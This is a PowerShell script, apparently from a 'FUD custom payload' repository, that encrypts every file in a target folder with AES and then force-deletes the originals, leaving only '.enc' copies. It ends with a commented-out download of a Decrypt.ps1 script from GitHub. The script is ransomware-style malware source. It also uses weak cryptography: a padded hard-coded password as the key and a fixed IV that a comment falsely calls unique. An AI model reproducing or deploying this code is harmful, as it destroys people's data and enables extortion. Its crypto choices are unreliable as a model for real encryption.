# Define the folder path containing the files to encrypt 
$folderPath = "F:\Testing"

# Set the password
$password = "12345"

# Convert the password to a secure string
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force

# Convert secure string password to plain text
$plaintextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePassword))

# Define encryption method
$encryptionMethod = @{
    KeySize = 256
    BlockSize = 128
    Mode = 'CBC'
    Padding = 'PKCS7'
}

# Function to encrypt a file
function Encrypt-File {
    param (
        [string]$FilePath,
        [hashtable]$EncryptionMethod
    )

    # Generate AES encryption object
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.KeySize = $EncryptionMethod['KeySize']
    $aes.BlockSize = $EncryptionMethod['BlockSize']
    $aes.Mode = $EncryptionMethod['Mode']
    $aes.Padding = $EncryptionMethod['Padding']

    # Set key and IV
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($plaintextPassword.PadRight(32))  # Pad password to match key size (for AES-256)
    $aes.IV = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")  # Use a unique IV

    # Create file streams
    $fileStreamIn = [System.IO.File]::OpenRead($FilePath)
    $fileStreamOut = [System.IO.File]::Create("$FilePath.enc")

    # Create crypto streams
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStreamOut, $aes.CreateEncryptor(), 'Write')

    # Copy data through crypto stream
    $buffer = New-Object byte[] 4096
    do {
        $bytesRead = $fileStreamIn.Read($buffer, 0, $buffer.Length)
        $cryptoStream.Write($buffer, 0, $bytesRead)
    } while ($bytesRead -gt 0)

    # Close streams
    $cryptoStream.Close()
    $fileStreamIn.Close()
    $fileStreamOut.Close()

    # Delete the original file
    Remove-Item -Path $FilePath -Force
}

# Encrypt files in the folder
Get-ChildItem -Path $folderPath -File | ForEach-Object {
    Encrypt-File -FilePath $_.FullName -EncryptionMethod $encryptionMethod
}

# Define the URL of the raw script on GitHub for Decrypt.ps1
$decryptScriptUrl = "https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/Decrypt.ps1"

# Define the local path where you want to save Decrypt.ps1
$decryptScriptPath = Join-Path -Path $folderPath -ChildPath "Decrypt.ps1"

# Download the Decrypt.ps1 script from GitHub
#Invoke-WebRequest -Uri $decryptScriptUrl -OutFile $decryptScriptPath
# $decryptScriptPath
